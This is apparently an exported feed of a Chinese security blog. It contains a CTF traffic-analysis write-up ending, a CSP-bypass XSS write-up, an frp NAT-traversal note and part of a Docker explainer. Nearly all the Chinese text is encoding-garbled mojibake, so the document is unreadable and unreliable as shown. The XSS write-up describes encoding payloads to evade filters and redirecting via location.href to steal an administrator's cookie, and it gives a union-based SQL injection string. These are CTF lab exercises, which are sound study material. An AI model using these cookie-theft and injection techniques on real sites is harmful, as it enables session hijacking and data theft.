å’ŒSSIDç”ŸæˆPSKï¼Œtypeé€‰æ‹©PSKå°±å¥½ã€‚<br>ç‚¹å‡»ç¡®è®¤åå°±å¯ä»¥åœ¨æ•°æ®åŒ…é¡µé¢çœ‹åˆ°è§£å¯†çš„åˆ†ç»„äº†ã€‚<br>é¦–å…ˆè¿‡æ»¤httpå’Œtcpåˆ†ç»„ï¼Œè¯­æ³•ä¸ºï¼šhttp and tcp<br>è¿‡æ»¤åå‘ç°æœ‰ä¸Šä¼ å›¾ç‰‡çš„åˆ†ç»„ï¼Œé‚è¿‡æ»¤ä¹‹ï¼Œå–å…¶æ•°æ®å¹¶å¯¼å‡ºã€‚<br>å¯¼å‡ºæ–¹æ³•ï¼š<br>é€‰æ‹©åˆ†ç»„ï¼Œåœ¨åˆ†ç»„è¯¦æƒ…é‚£é€‰ä¸­media type å°±å¯ä»¥è‡ªåŠ¨é€‰æ‹©åª’ä½“æ•°æ®ã€‚ ç„¶åå³é”®å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµå°±å¯ä»¥å¯¼å‡ºå›¾ç‰‡äº†ã€‚</p><h1 id="å›¾ç‰‡åˆ†æ"><a href="#å›¾ç‰‡åˆ†æ" class="headerlink" title="å›¾ç‰‡åˆ†æ"></a>å›¾ç‰‡åˆ†æ</h1><p>ä¹ æƒ¯æ€§åœ°ä¸¢åˆ°binwalkåˆ†æï¼Œåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæœ‰å¯†ç ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œè€ƒè™‘ä»æ•°æ®åŒ…æ‰¾ç­”æ¡ˆã€‚<br>å…¶å®åšåˆ°è¿™é‡Œæœ‰ç‚¹æ²¡æ€è·¯äº†ï¼Œçœ‹äº†çœ‹è§£æå‘ç°æ¥ä¸‹æ¥åšä¸‹å»è¦çœ‹sessionã€‚sessionæ˜¯JWTæ ¼å¼ï¼Œ<br>è¿˜åŸåœ°å€ï¼š<a href="https://www.jstoolset.com/jwt">https://www.jstoolset.com/jwt</a><br>è¿˜åŸåï¼š<img src="http://cdn.polowong.top/static/images/jwt1.png"><br>æç¤ºå‹ç¼©åŒ…å¯†ç æ˜¯åˆšæ‰pingè¿‡çš„ä¸€ä¸ªç½‘ç«™ï¼Œäºæ˜¯æœç´¢icmpåè®®ï¼Œä½†æ˜¯æ²¡æœ‰ã€‚</p><h1 id="æŸ³æš—èŠ±æ˜"><a href="#æŸ³æš—èŠ±æ˜" class="headerlink" title="æŸ³æš—èŠ±æ˜"></a>æŸ³æš—èŠ±æ˜</h1><p>å»pingåŸŸåçš„è¯ä¼šå…ˆè¿›è¡Œdnsè§£æï¼Œäºæ˜¯è¿‡æ»¤dnsåè®®ï¼Œåœ¨æœ€åä¸€ä¸ªdnsåè®®åŒ…é‡Œé¢æ‰¾åˆ°pingçš„åŸŸåï¼Œä½œä¸ºå‹ç¼©åŒ…å¯†ç å¡«è¿›å»ï¼Œå¾—åˆ°flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSP-XSS Bypass</title>
      <link href="2020/06/02/CSP-XSS-Bypass/"/>
      <url>2020/06/02/CSP-XSS-Bypass/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br><a href="https://xz.aliyun.com/t/5084#toc-2">https://xz.aliyun.com/t/5084#toc-2</a><br><a href="https://www.cnblogs.com/thenbz3/p/11863641.html">https://www.cnblogs.com/thenbz3/p/11863641.html</a></p><h1 id="CSPçš„æ¦‚å¿µ"><a href="#CSPçš„æ¦‚å¿µ" class="headerlink" title="CSPçš„æ¦‚å¿µ"></a>CSPçš„æ¦‚å¿µ</h1><p>CSP æ˜¯ Content Security Policy çš„ç¼©å†™ï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚CSPæ—¨åœ¨å‡å°‘XSSæ”»å‡»ï¼Œå…·ä½“åŸç†æ˜¯é€šè¿‡è®¾ç½®response headeræˆ–è€…åœ¨é¡µé¢ä¸­ä½¿ç”¨metaæ ‡ç­¾è§„å®šå—ä¿¡ä»»çš„ã€å¯æ‰§è¡Œçš„JSã€å›¾ç‰‡ã€iframeã€styleæ¥æºã€‚<br>ä»»ä½•ä¸ç¬¦åˆCSPè§„åˆ™çš„èµ„æºéƒ½å°†æ— æ³•è¢«åŠ è½½ã€‚</p><h1 id="CSPç¤ºä¾‹"><a href="#CSPç¤ºä¾‹" class="headerlink" title="CSPç¤ºä¾‹"></a>CSPç¤ºä¾‹</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; </span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><p>èµ„æºé™åˆ¶ç±»å‹ï¼ˆå¼•ç”¨ï¼‰ï¼š<br>script-srcï¼šå¤–éƒ¨è„šæœ¬ æŒ‡å®šäº†å…è®¸ä»å“ªé‡ŒåŠ è½½JSè„šæœ¬<br>style-srcï¼šæ ·å¼è¡¨<br>img-srcï¼šå›¾åƒ<br>media-srcï¼šåª’ä½“æ–‡ä»¶ï¼ˆéŸ³é¢‘å’Œè§†é¢‘ï¼‰<br>font-srcï¼šå­—ä½“æ–‡ä»¶<br>object-srcï¼šæ’ä»¶ï¼ˆæ¯”å¦‚ Flashï¼‰<br>child-srcï¼šæ¡†æ¶<br>frame-ancestorsï¼šåµŒå…¥çš„å¤–éƒ¨èµ„æº<br>connect-srcï¼šHTTP è¿æ¥ï¼ˆé€šè¿‡ XHRã€WebSocketsã€EventSourceç­‰ï¼‰<br>worker-srcï¼šworkerè„šæœ¬<br>manifest-srcï¼šmanifest æ–‡ä»¶<br>default-src â€˜selfâ€™ è¯¥å±æ€§å€¼ä¸ºselfæ—¶åªå…è®¸æœ¬ç«™èµ„æºåŠ è½½ã€‚è®¾ç½®äº†è¿™ä¸ªå°±ä¸ºä¸Šè¿°å±æ€§è®¾ç½®äº†é»˜è®¤å€¼â€˜selfâ€™<br>ä¸Šè¿°å±æ€§å¦‚æœä¸æ˜ç¡®æŒ‡å®šçš„è¯åˆ™é»˜è®¤èŒƒå›´æ˜¯*ï¼Œå³å…è®¸æ‰€æœ‰ã€‚<br>script-srcå±æ€§é‡Œé¢ è®¾ç½®unsafe-inline å…è®¸å†…åµŒçš„è„šæœ¬åŠæ ·å¼ ä¸å†™è¿™ä¸ªé»˜è®¤ä¸å…è®¸ã€‚<br>script-srcå±æ€§é‡Œé¢ è®¾ç½®unsafe-eval   å…è®¸é€šè¿‡å­—ç¬¦ä¸²åŠ¨æ€åˆ›å»ºçš„è„šæœ¬æ‰§è¡Œï¼Œæ¯”å¦‚ evalï¼ŒsetTimeout ç­‰ã€‚ä¸å†™è¿™ä¸ªé»˜è®¤ä¸å…è®¸ã€‚<br>script-src â€˜nonce-EDNnf03nceIOfn39fn3e9h3sdfaâ€™ è¿™å¥è¯çš„æ„æ€æ˜¯è¯´åªå…è®¸nonceå€¼ä¸ºEDNnf03nceIOfn39fn3e9h3sdfaçš„è„šæœ¬æ‰§è¡Œã€‚(<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">xxx</script>) åŒç†ä¹Ÿå¯ä»¥è®¾ç½®hashå€¼ã€‚</p><h1 id="CSPç»•è¿‡"><a href="#CSPç»•è¿‡" class="headerlink" title="CSPç»•è¿‡"></a>CSPç»•è¿‡</h1><p>CSPç»•è¿‡æˆ‘åªä½¿ç”¨è¿‡ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯Location.hrefï¼Œå…¶ä»–çš„æ–¹æ³•æš‚æ—¶æ²¡æœ‰å°è¯•è¿‡ï¼Œåœ¨ <a href="https://xz.aliyun.com/t/5084#toc-2">https://xz.aliyun.com/t/5084#toc-2</a> è¿™ç¯‡æ–‡ç« é‡Œé¢å†™çš„æŒºå¤šçš„ï¼Œå¯ä»¥ä»”ç»†é˜…è¯»ã€‚<br>å¦å¤–ä¸€ç§æˆ‘æ„Ÿè§‰æœ‰æ„æ€çš„ç»•è¿‡å°±æ˜¯CRLFæ³¨å…¥ç»•è¿‡ï¼Œåœ¨CSPä¹‹å‰æ‰¾åˆ°CRLFæ³¨å…¥ç‚¹æ¥ä¸¤ä¸ªCRLFæŠŠCSPæŒ¤åˆ°bodyé‡Œé¢ã€‚ã€‚é«˜ï¼Œå®åœ¨æ˜¯é«˜</p><h1 id="CSP-BYPASSå®ä¾‹"><a href="#CSP-BYPASSå®ä¾‹" class="headerlink" title="CSP BYPASSå®ä¾‹"></a>CSP BYPASSå®ä¾‹</h1><p>è¿™é“é¢˜æ˜¯CSICN_åä¸œåŒ—èµ›åŒº_WEB2 åœ¨buuojæœ‰å¤ç°ã€‚<br>å…¶ä»–çš„ç‚¹æˆ‘çœ‹ç½‘ä¸Šéƒ½è¯´çš„å·®ä¸å¤šäº† å”¯ç‹¬CSP Bypassè¯´çš„ä¸è¯¦ç»†ï¼Œè¿™é‡Œæˆ‘è¯¦ç»†è¯´ä¸€ä¸‹CSPç»•è¿‡ï¼Œå…¶ä»–çš„ä¸ä»”ç»†è¯´ï¼Œå°±ç®€è¦è¯´ä¸€ä¸‹å¦‚ä½•æˆåŠŸæ‹¿åˆ°flagã€‚<br>æœ‰ä¸ªæŠ•ç¨¿å’Œåé¦ˆï¼Œè¯´äº†ç®¡ç†å‘˜ä¼šæŸ¥çœ‹ï¼ŒçŒœæµ‹XSSæ‹¿cookieã€‚æäº¤ç”³è¯·æ—¶éœ€è¦çˆ†ç ´md5ï¼Œå¥½è¯´ï¼Œå†™è„šæœ¬å³å¯ã€‚<br>å…ˆå°è¯•éšä¾¿æŠ•ç¨¿<br>æŠ•ç¨¿åæŸ¥çœ‹é¡µé¢ï¼Œå‘ç°å­˜åœ¨CSPï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡cspã€‚<br>æ¥ä¸‹æ¥è¿›è¡ŒXSSï¼Œç”±äºè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œæ‰€ä»¥è€ƒè™‘HTMLå®ä½“ç¼–ç â€”æŠŠå­—æ¯è½¬asciiå¹¶åœ¨å‰é¢åŠ ä¸Š&amp;#åé¢åŠ ä¸Š;<br><svg>æ ‡ç­¾å¯ä»¥åµŒå…¥JSä»£ç ã€‚<br>ç›´æ¥ç”¨XSSå¹³å°çš„payloadçš„è¯ä¼šè¿™æ ·ï¼š</p><img src="http://cdn.polowong.top/static/images/csp1.png"><p>æ¥ä¸‹æ¥ä½¿ç”¨location.hrefç»•è¿‡ã€‚<br>çˆ†ç ´å®Œmd5åç®¡ç†å‘˜ç‚¹å‡»å®Œåœ¨XSSå¹³å°å°±æ”¶åˆ°cookieå•¦ã€‚<br>æ¥ä¸‹æ¥æ˜¯è”åˆæ³¨å…¥ï¼Œæœ€åä¸€å¥è¯æ˜¯-1 union select 1,2,flagg  from ciscn.flagï¼Œå¾—åˆ°flag</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™é“é¢˜æ—¶éš”ä¸€å¹´æ‰å¼„æ˜ç™½CSPæ˜¯æ€ä¹ˆå›äº‹ï¼Œå±å®æˆ‘çš„é—®é¢˜ï¼Œç»§ç»­å­¦ä¹ ï¼Œç»§ç»­åŠªåŠ›ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frpå†…ç½‘ç©¿é€</title>
      <link href="2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756">https://blog.csdn.net/fjh1997/article/details/100850756</a><br><a href="https://zhuanlan.zhihu.com/p/45445979">https://zhuanlan.zhihu.com/p/45445979</a><br>æœ€è¿‘åœ¨æ­å»ºå­¦æ ¡çš„ç½‘ç»œå®‰å…¨è®­ç»ƒå¹³å°ï¼Œä½¿ç”¨çš„æ˜¯CTFD+CTF-Whaleç»„ä»¶ç”ŸæˆåŠ¨æ€ç‹¬ç«‹é¶æœºï¼Œç”±æ­¤å¼•å‘äº†å¯¹å†…ç½‘ç©¿é€çš„æ€è€ƒã€‚<br>é¦–å…ˆç†è§£ä»€ä¹ˆæ˜¯å†…ç½‘ç©¿é€</p><h1 id="å†…ç½‘ç©¿é€çš„æ¦‚å¿µ"><a href="#å†…ç½‘ç©¿é€çš„æ¦‚å¿µ" class="headerlink" title="å†…ç½‘ç©¿é€çš„æ¦‚å¿µ"></a>å†…ç½‘ç©¿é€çš„æ¦‚å¿µ</h1><p>äº†è§£å†…ç½‘ç©¿é€å‰ï¼Œéœ€è¦äº†è§£å†…ç½‘ç©¿é€è¿™ä¸ªéœ€æ±‚å‡ºç°çš„åŸå› ã€‚<br>ipv4åœ°å€ç¨€ç¼ºï¼Œäºæ˜¯å‡ºç°äº†NAT,NAPTæŠ€æœ¯å®ç°IPâ€å¤ç”¨â€ã€‚<br>NATï¼š<br>å°†ç§ç½‘åœ°å€é€šè¿‡NATç½‘å…³è½¬æ¢æˆå…¬ç½‘åœ°å€ï¼ŒåŒæ—¶é€šä¿¡çš„æ•°é‡å—NATç½‘å…³å…¬ç½‘åœ°å€æ•°é™åˆ¶ã€‚<br>NAPT:<br>å°†ç§ç½‘åœ°å€å’Œç«¯å£å·é€šè¿‡NAPTç½‘å…³è½¬æ¢æˆå…¬ç½‘åœ°å€ï¼šç«¯å£å·ï¼ŒNAPTç½‘å…³ç»´æŠ¤ä¸€å¼ æ˜ å°„è¡¨ï¼Œè®°å½•å…¬ç½‘ip:portå’Œç§ç½‘ip:portçš„å¯¹åº”å…³ç³»ã€‚<br>è¿™æ ·å¯ä»¥å¤§å¹…åº¦é™ä½å¯¹å…¬ç½‘IPçš„éœ€æ±‚é‡ã€‚<br>ä¸ºä»€ä¹ˆéœ€è¦å†…ç½‘ç©¿é€ï¼Ÿ<br>æˆ‘å®¶ç”µè„‘æ˜¯ç§»åŠ¨çš„ï¼Œæ²¡æœ‰ç»™åˆ†é…ç‹¬ç«‹çš„å…¬ç½‘IPï¼Œæˆ‘åœ¨æœ¬æœºæ­å»ºçš„httpæœåŠ¡æ— æ³•è¢«å…¬ç½‘çœ‹åˆ°ã€‚ä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜ï¼Œå†…ç½‘ç©¿é€æŠ€æœ¯åº”éœ€æ±‚è€Œç”Ÿã€‚<br>æ¯”å¦‚è®¿é—®æˆ‘å®¶ç”µè„‘8888ç«¯å£çš„webæœåŠ¡ï¼Œç›´æ¥è®¿é—®æˆ‘ipip.netçœ‹åˆ°çš„ipåœ°å€:8888æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå› ä¸ºNATç½‘å…³æ²¡æœ‰8888å‡ºç«™è®°å½•   çš„æ˜ å°„å…³ç³»ã€‚<br>å†…ç½‘ç©¿é€æ¦‚å¿µï¼ˆå¤åˆ¶ï¼‰ï¼š<br>å†…ç½‘ç©¿é€æ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œç½‘ç»œè¿æ¥æ—¶çš„ä¸€ç§æœ¯è¯­ï¼Œä¹Ÿå«åšNATç©¿é€ï¼Œå³åœ¨è®¡ç®—æœºæ˜¯å±€åŸŸç½‘å†…çš„æ—¶å€™ï¼Œå¤–ç½‘ä¸å†…ç½‘çš„è®¡ç®—æœºçš„èŠ‚ç‚¹è¿›è¡Œè¿æ¥æ—¶æ‰€éœ€è¦çš„è¿æ¥é€šä¿¡ï¼Œæœ‰æ—¶å€™å°±ä¼šå‡ºç°å†…ç½‘ç©¿é€ä¸æ”¯çš„æƒ…å†µã€‚å†…ç½‘ç©¿é€çš„åŠŸèƒ½å°±æ˜¯ï¼Œå½“æˆ‘ä»¬åœ¨ç«¯å£æ˜ å°„æ—¶è®¾ç½®æ—¶ï¼Œå†…ç½‘ç©¿é€èµ·åˆ°äº†åœ°å€è½¬æ¢çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯æŠŠå…¬ç½‘çš„åœ°å€è¿›è¡Œç¿»è¯‘ï¼Œè½¬æˆä¸ºä¸€ç§ç§æœ‰çš„åœ°å€ï¼Œç„¶åå†é‡‡ç”¨è·¯ç”±çš„æ–¹å¼ADSLçš„å®½å¸¦è·¯ç”±å™¨ï¼Œå…·æœ‰ä¸€ä¸ªåŠ¨æ€æˆ–è€…æ˜¯å›ºå®šçš„å…¬ç½‘IPï¼Œæœ€åADSLç›´æ¥åœ¨äº¤æ¢æœºä¸Šï¼Œè¿™æ ·æ‰€æœ‰çš„ç”µè„‘éƒ½å¯ä»¥å…±äº«ä¸Šç½‘ã€‚å†…ç½‘ç©¿é€é™¤äº†å¯ä»¥å®ç°å†…ç½‘ä¹‹é—´æœºå™¨çš„ç½‘ç»œé€šä¿¡åŠŸé€šä¹‹å¤–ï¼Œè¿˜å¯ä»¥è§£å†³UDPä¸­å‡ºç°çš„æ•°æ®ä¼ è¾“ä¸ç¨³å®šé—®é¢˜ã€‚<br>çœ‹äº†ä¸¤å¼ å›¾æ„Ÿè§‰å†™çš„æ¯”è¾ƒå¥½</p><img src="http://cdn.polowong.top/static/images/nwct1.png"><img src="http://cdn.polowong.top/static/images/nwct2.png"><h1 id="å†…ç½‘ç©¿é€çš„æ€è·¯"><a href="#å†…ç½‘ç©¿é€çš„æ€è·¯" class="headerlink" title="å†…ç½‘ç©¿é€çš„æ€è·¯"></a>å†…ç½‘ç©¿é€çš„æ€è·¯</h1><p>å†…ç½‘ç”µè„‘ä¸»åŠ¨å‘æ¶ˆæ¯ç»™å…¬ç½‘æœåŠ¡å™¨ï¼Œç›¸å½“äºå…¬ç½‘æœåŠ¡å™¨åœ¨è½¬å‘å†…ç½‘æœåŠ¡å™¨çš„æ•°æ®ï¼Œä½¿ç”¨ç¬¬ä¸‰å°æœºå™¨è®¿é—®å…¬ç½‘æœåŠ¡å™¨çš„æ—¶å€™å³å¯è®¿é—®å†…ç½‘æœåŠ¡å™¨æä¾›çš„æœåŠ¡ã€‚è¿™å—å…¬ç½‘æœåŠ¡å™¨å¸¦å®½é™åˆ¶ã€‚</p><h1 id="å†…ç½‘ç©¿é€å®ç°ï¼ˆfrpï¼‰"><a href="#å†…ç½‘ç©¿é€å®ç°ï¼ˆfrpï¼‰" class="headerlink" title="å†…ç½‘ç©¿é€å®ç°ï¼ˆfrpï¼‰"></a>å†…ç½‘ç©¿é€å®ç°ï¼ˆfrpï¼‰</h1><p>ç½‘ç»œç»“æ„ï¼š æœåŠ¡å™¨ä¸ºWindows10ï¼Œç§»åŠ¨å¤§å†…ç½‘xD,æœåŠ¡å™¨æ˜¯æˆ‘ç§‘å­¦ä¸Šç½‘ç”¨çš„vpsï¼Œæœ‰ç‹¬ç«‹çš„å…¬ç½‘IPã€‚<br>è½¯ä»¶å®‰è£…ï¼šé¦–å…ˆåœ¨githubä¸Šä¸‹è½½å¯¹åº”ç³»ç»Ÿæ¶æ„çš„frpï¼ŒWindowsæ¯”è¾ƒå¥½é€‰ï¼Œæˆ‘å‡ºé—®é¢˜çš„æ˜¯vpsçš„ç‰ˆæœ¬é€‰æ‹©ï¼Œä¸€å¼€å§‹é€‰çš„æ˜¯amd64ç‰ˆæœ¬ï¼Œä½†æ˜¯æ— æ³•æ‰§è¡Œbin file,ä½¿ç”¨archå‘½ä»¤æŸ¥çœ‹æ¶æ„åæ‰å‘ç°æ¶æ„ä¸ºi686ï¼Œæ˜¯32ä½ç³»ç»Ÿã€‚ã€‚ã€‚å“ã€‚<br>è½¯ä»¶é…ç½®ï¼š    è½¯ä»¶é…ç½®å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/45445979">https://zhuanlan.zhihu.com/p/45445979</a>  è¿™é‡Œä¸æƒ³åœ¨è¯¦ç»†å±•å¼€è¯´ï¼Œæ³¨æ„å‡ ç‚¹ï¼Œå°±æ˜¯ä¸èƒ½äººå®¶å†™ä»€ä¹ˆä½ å°±å†™ä»€ä¹ˆï¼Œéœ€è¦æ˜ç™½å„ä¸ªé…ç½®çš„æ„ä¹‰ï¼Œå¦åˆ™ä½ æè¿™ç©¿ä»€ä¹ˆå‘¢ï¼Ÿ<br>vhost_http_port å‚æ•°é…ç½®çš„æ˜¯webæœåŠ¡çš„ç«¯å£ï¼Œéœ€è¦åœ¨frpcå®¢æˆ·ç«¯å®šä¹‰domainï¼ˆæ²¡æœ‰çš„è¯å°±å†™æœåŠ¡å™¨ipï¼‰ï¼ŒæŒ‡æ˜æœ¬åœ°webæœåŠ¡ç«¯å£ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockeræŠ€æœ¯åŸç†æµ…æ</title>
      <link href="2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
      <url>2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://www.zhihu.com/question/331023021">https://www.zhihu.com/question/331023021</a><br><a href="https://www.zhihu.com/question/48174633/answer/616413576">https://www.zhihu.com/question/48174633/answer/616413576</a><br>åˆ«äººè¯´çš„è¯æˆ‘å°±ä¸å¤åˆ¶ç²˜è´´äº†ï¼ŒæŒ‘ä¸€äº›æˆ‘ä¸ªäººè®¤ä¸ºæ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹å’Œæ¯”è¾ƒåŸºç¡€çš„ç‚¹è¯´ä¸€ä¸‹ã€‚</p><h1 id="dockerçš„ä¸€äº›æ¦‚å¿µ"><a href="#dockerçš„ä¸€äº›æ¦‚å¿µ" class="headerlink" title="dockerçš„ä¸€äº›æ¦‚å¿µ"></a>dockerçš„ä¸€äº›æ¦‚å¿µ</h1><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p> imageæ˜¯ä¸€å †åªè¯»å±‚çš„ç»Ÿä¸€è§†è§’ï¼ŒUFSæŠ€æœ¯å¯ä»¥æŠŠè¿™ä¸€å¯¹åªè¯»å±‚æ•´åˆæˆä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</p><h2 id="container"><a href="#container" class="headerlink" title="container"></a>container</h2><p> å®¹å™¨å°±æ˜¯åœ¨imageä¸Šé¢åŠ äº†ä¸€ä¸ªå¯è¯»å¯å†™å±‚ã€‚<br>container=image+ R&amp;W Layer<br>docker start=docker create &amp; docker run</p><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p> Repositoryæ„æ€ä¸ºä»“åº“ï¼Œç±»ä¼¼githubä¸Šé¢æœ‰å¾ˆå¤šä»£ç å¯ä»¥cloneåˆ°æœ¬åœ°ï¼Œåœ¨dockerä¸­å°±ç›¸å½“äºå¯ä»¥pullé•œåƒåˆ°æœ¬åœ°ã€‚å®˜æ–¹çš„ä»“åº“æ˜¯docker hub</p><h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><p> Registryæ˜¯ç§æœ‰ä»“åº“ï¼ŒRegistryåŒ…å«äº†ä¸€ä¸ªæˆ–å¤šä¸ªRepositoryï¼Œæ¯ä¸ªRepositoryå¯ä»¥æœ‰å¤šä¸ªTagï¼Œæ¯ä¸ªTagå¯¹åº”ä¸€ä¸ªimageã€‚<br>æˆ‘ç†è§£çš„dockeræ˜¯â€è½»é‡çº§â€è™šæ‹Ÿæœºã€‚è¿™ä¸ªæ¦‚å¿µåº”è¯¥ä¸æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºè™šæ‹Ÿæœºå’Œdockerçš„åŒºåˆ«è¿˜æ˜¯æŒºå¤§çš„ï¼Œå†å¤šæŠ½è±¡å‡ å±‚æˆ‘æ„Ÿè§‰è¿™ä¹ˆç†è§£ä¹Ÿå¯ä»¥<br>dockerçš„æ–¹ä¾¿ä¹‹å¤„åœ¨äºä¸éœ€è¦åƒè™šæ‹Ÿæœºä¸€æ ·é‡æ–°è™šæ‹Ÿå‡ºæ¥ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿï¼Œdockeråªéœ€è¦pullé•œåƒç›´æ¥ç”¨å°±è¡Œã€‚<br>dockerå¯ä»¥å¿«é€Ÿéƒ¨ç½²çš„å¦ä¸€ä¸ªåŸå› é™¤äº†æ˜¯åˆ†å±‚å¯å¤ç”¨ä¹‹å¤–ï¼Œå°±æ˜¯å¯ä»¥â€ä¸€é”®â€å®‰è£…æ‰€éœ€ä¾èµ–ã€‚æˆ‘ç†è§£çš„æ˜¯ç±»ä¼¼makefileã€‚<br>dockerfileç±»ä¼¼makefileï¼Œä½†æ˜¯ä¸€ä¸ªdockerfileå¯¹åº”ä¸€ä¸ªå®¹å™¨æˆ–è€…è¯´å¯¹åº”ç€ä¸€ä¸ªæœåŠ¡ï¼ˆå¦‚MySQLï¼‰ç„¶ådocker-compose.yml åŒ…å«ä¸€ä¸ªä¸ªdockerfileæ–‡ä»¶å½¢æˆäº†ä¸€ä¸ªå·¥ç¨‹ã€‚<br>docker è¿›ç¨‹ä¼šå¯¹æ¯ä¸ªå®¹å™¨çš„èµ„æºè¿›è¡Œç®¡ç†ã€‚<br>dockerçš„é•œåƒåˆ†å±‚æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œæœ‰ç‚¹ç±»ä¼¼é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³çš„â€ç»§æ‰¿â€ã€‚<br>dockerçš„åŸºç¡€é•œåƒåº”è¯¥æ˜¯æœ€å¤§çš„ï¼Œä½†æ˜¯ä»åŸºç¡€é•œåƒæ–°å»ºä¸€ä¸ªé•œåƒçš„è¯ï¼Œå¹¶ä¸éœ€è¦å¤åˆ¶æ‰€æœ‰å†…å®¹ï¼Œå³ä¸éœ€è¦å ç”¨ä¸¤å€çš„å­˜å‚¨ç©ºé—´ï¼Œåªéœ€è¦æŠŠä¸ä¸€æ ·çš„ä¿å­˜ä¸‹æ¥å°±å¥½ã€‚<br>è¿™å¾—ç›ŠäºLinuxçš„COWç­–ç•¥ã€‚å³ï¼šæ²¡å†™è¿‡æ–‡ä»¶çš„ä¸ç”¨åŠ¨ï¼Œå†™è¿‡çš„æ–‡ä»¶ä¿å­˜æˆæ–°çš„æ–‡ä»¶ã€‚<br>dockerä¼šåœ¨å®¹å™¨æœ€ä¸Šå±‚åˆ›å»ºä¸€ä¸ªè¯»å†™å±‚ï¼Œç”¨æ¥ä¿å­˜å¯¹åŸºç¡€é•œåƒçš„ä¿®æ”¹æ“ä½œæ“ä½œçš„æ–‡ä»¶ã€‚</p><h1 id="dockerä¸è™šæ‹Ÿæœºçš„åŒºåˆ«"><a href="#dockerä¸è™šæ‹Ÿæœºçš„åŒºåˆ«" class="headerlink" title="dockerä¸è™šæ‹Ÿæœºçš„åŒºåˆ«"></a>dockerä¸è™šæ‹Ÿæœºçš„åŒºåˆ«</h1><p>é¦–å…ˆæ˜¯è™šæ‹ŸåŒ–å±‚æ¬¡ä¸ä¸€æ ·ã€‚è™šæ‹Ÿæœºå®Œæ•´åœ°è™šæ‹Ÿäº†å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ï¼Œè€Œdockerä»…ä»…æ˜¯è™šæ‹Ÿäº†ç”¨æˆ·ç©ºé—´ï¼Œå†…æ ¸ç”¨çš„æ˜¯æ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚æ¯ä¸ªå®¹å™¨åªæ˜¯è¯´ç›¸äº’ä¹‹é—´çš„åº”ç”¨ã€ä¾èµ–ä¸åŒï¼Œä½†å…¶æœ€åº•å±‚çš„é•œåƒåº”è¯¥æ˜¯ç›¸åŒçš„ã€‚ä»–ä»¬ç”¨å…±åŒä¸€ä¸ªåŸºç¡€é•œåƒï¼Œå¯¹åŸºç¡€é•œåƒæœ‰ä¿®æ”¹ï¼Œè¿™ä¸ªä¿®æ”¹ä¿å­˜åˆ°å„ä¸ªå®¹å™¨å†…éƒ¨ï¼Œdockerè¿›ç¨‹å¯¹å®¹å™¨ä¹‹é—´è¿›è¡Œéš”ç¦»ã€‚<br>dockerå¯åŠ¨é€Ÿåº¦å¿«ï¼Œå 